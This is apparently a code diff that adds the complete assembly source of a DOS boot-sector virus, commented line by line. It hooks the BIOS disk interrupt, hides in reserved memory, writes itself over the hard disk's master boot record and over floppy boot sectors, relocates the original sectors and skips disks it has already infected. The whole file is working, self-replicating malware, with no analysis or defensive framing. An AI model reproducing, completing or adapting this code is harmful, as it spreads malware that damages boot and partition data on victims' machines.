@@ -1,0 +1,185 @@
+org 0
+jmp 03e
+
+
+org 03e
+jmp 07c0:044                    ;Align IP to 0
+ishard db 00                    ;0 if Floppy infection, other wise hard.
+
+xor ax,ax
+mov ds,ax                       ;DS=0
+mov ax,[0413]                   ;Get amount of mem.
+xor di,di               
+xor si,si                       ;SI and DI=0
+dec ax                          ;Take one away from amount of mem
+mov cl,06
+mov [0413],ax                   ;give INT 12 return new amount
+shl ax,cl                       ;get reserved segment for virus
+mov es,ax                       ;ES=reserved segment
+xchg ax,[04e]                   ;INT 13 seg=VIRSEG, AX=old INT 13 seg
+mov origseg + 07c00,ax          ;move old seg to storage location
+mov ax,offset handler           ;location of Virus INT 13 handler
+xchg ax,[04c]                   ;INT 13 off=d7, ax=old INT 13 off
+mov origoff + 07c00,ax          ;move old off to storage location
+push cs
+pop ds                          ;DS=CS
+mov cx,0200                     ;Copy 200(512) bytes (from DS/CS to ES/VIRSEG)
+repz 
+movsb                           ;copying bytes
+push es                         ;push VIRSEG
+mov ax,offset entry               
+push ax                         ;push 77
+retf                            ;Jump to VIRSEG:77
+
+entry:                          ;THIS IS WHERE THE CODE STARTS IN THE NEW SEGMENT
+and ishard,1                    ;test hard disk indicator
+jnz nothard                     ;if hard, jump pass hard disk infector to HARD exit
+push cs 
+pop ds                          ;DS=CS
+mov ax,0201                     ;read one sector
+mov bx,0200                     ;to ES:200
+mov cx,1                        ;sector 1, track 0
+mov dx,080                      ;side 0, drive 80 (first phsy HD)
+call int13                      ;INT 13
+call checkinf                   ;CHECK IF INFECTED
+jcxz fexit                      ;if ready infected jump pass infector to FLOPPY exit
+mov ishard,1                    ;INFECTION TYPE = HARD
+call copyboot                   ;copy partion / boot info to virus
+mov ax,0302                     ;write 2 sectors
+mov cx,1                        ;Sector 1, track 0 (orig Part Tbl to sector 2)
+xor bx,bx                       ;form ES:0
+mov dx,080                      ;side 0, drive 80
+call int13                      ;INT 13
+
+fexit:                          ;FLOPPY exit
+call getrootsect                ;get sector of orgig. boot sect.
+mov dl,0                        ;drive A:
+jmp >l0                         ;jmp pass harddrv loader
+
+
+nothard:                        ;HARDRV loader
+mov cx,0002                     ;orig boot sect. at sector 2
+mov dx,080                      ;drive C:
+
+l0:                             ;exit body, pass to orig boot sect.
+mov ax,0201                     ;load one sector (ready chosen);
+xor bx,bx               
+mov es,bx                       ;at SEGMENT 0
+mov bh,07c                      ;OFFSET 7c00 (0:7c00)
+call int13                      ;int13
+jmp 0:07c00                     ;jmp to loaded sector.
+
+db '-=>SêpóLÁÅrí<=-'    ;:-)
+
+handler:
+push ax
+push bx
+push cx
+push dx
+push ds
+push es
+push di
+push si                         ;save regs
+
+cmp ah,2                        ;function => read
+jb notwr                        ;else EXIT
+cmp ah,5                        ;and function =< verify
+jnb notwr                       ;else EXIT
+cmp dl,2                        ;drive < 2
+jnb notwr                       ;else EXIT
+call infect                     ;all is good, call infector
+notwr:                          ;EXIT
+
+pop si                          ;restore regs
+pop di
+pop es
+pop ds
+pop dx
+pop cx
+pop bx
+pop ax
+cs:
+jmp far [origoff]               ;jump to orig int 13.
+
+infect:                         ;INFECTOR
+push cs
+pop es
+push es
+pop ds                          ;DS=ES=CS
+mov ax,0201                     ;read 1 sector
+mov dh,0                        ;side 0
+mov bx,0200                     ;off set 200
+mov cx,1                        ;sector 1, track 0
+call int13                      ;int13
+jc error                        ;if error jmp to ERROR
+call checkinf                   ;check if infected
+jcxz exitinf                    ;if infected jmp to EXIT
+call copyboot                   ;copy boot and partn info to virus
+call getrootsect                ;get sector to write orig boot to
+mov ishard,0                    ;FLOPPY infection
+mov bx,0200                     ;from offset 200
+mov ax,0301                     ;write 1 sector
+call int13                      ;int 13
+jc error                        ;if error jmp to ERROR
+xor bx,bx                       ;from offset 0
+mov cx,1                        ;sector 1, track 1
+mov dh,0                        ;side 1
+mov ax,0301                     ;write 1 sector
+call int13                      ;int13
+exitinf:                        ;EXIT
+ret                             ;return from infector and to orig int 13
+
+int13:
+pushf 
+cs:
+db 09a
+origoff dw 0
+origseg dw 0
+ret                             ;return
+
+copyboot:
+mov di,end    
+mov si,0200 + end               ;18c of orig sect
+mov cx,0200 - end
+repz
+movsb                           ;copy partition info
+mov di,2
+mov si,0202                     ;2 of orig sect
+mov cx,03c
+repz 
+movsb                           ;copy boot info
+ret                             ;return
+
+getrootsect:
+cmp byte ptr [015],0f9          ;if drive is 1.2m HD
+jnz gr1                         ;if not try next type
+mov cx,000e                     ;track 0, sect 14
+mov dh,1                        ;side 1
+ret                             ;return
+
+gr1:
+cmp byte ptr [015],0f0          ;if drive is 1.44m HD
+jnz gr2                         ;if not try next type
+mov cx,000f                     ;track 0, side 15
+mov dh,1                        ;side 1
+ret                             ;return
+
+gr2:                            ;if type not decided, just infect it as 360k floppy
+mov dh,1                        ;side 1
+mov cx, 3                       ;sector 3, track 0
+ret                             ;return
+
+error:
+xor ax,ax                       ;reset drive
+call int13                      ;int13
+ret                             ;exit from infector to orig int 13
+
+checkinf:
+mov cx,5                        ;cmpare 5 bytes
+mov si,048                      ;at 48
+mov di,0248                     ;and 248 (48 of orig boot)
+repz                            ;while still equal
+cmpsb                           ;cmpare        
+ret                             ;return (if the string was equal CX will now be 0)
+
+end:
